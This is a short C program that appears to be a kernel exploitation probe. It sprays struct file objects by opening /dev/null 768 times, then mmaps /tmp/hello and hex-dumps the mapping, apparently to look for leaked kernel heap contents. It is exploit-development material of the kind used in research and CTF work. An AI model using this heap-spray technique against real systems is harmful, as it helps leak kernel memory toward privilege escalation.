#include <stdio.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/mman.h>

typedef unsigned long long u64;

void hex_print(void *addr, size_t len)
{
    u64 tmp_addr = (u64)addr;
    puts("");
    for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
        printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
    }
}

int main()
{
	int fd = open("/tmp/hello", O_RDWR);
	assert(fd >= 0);

	for(int i=0; i<0x300; i++) { // do struct file spray
		open("/dev/null", O_RDONLY);
	}

	void *addr = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	printf("addr: %p\n", addr);
	hex_print(addr, 0x4000);

	getchar();
}
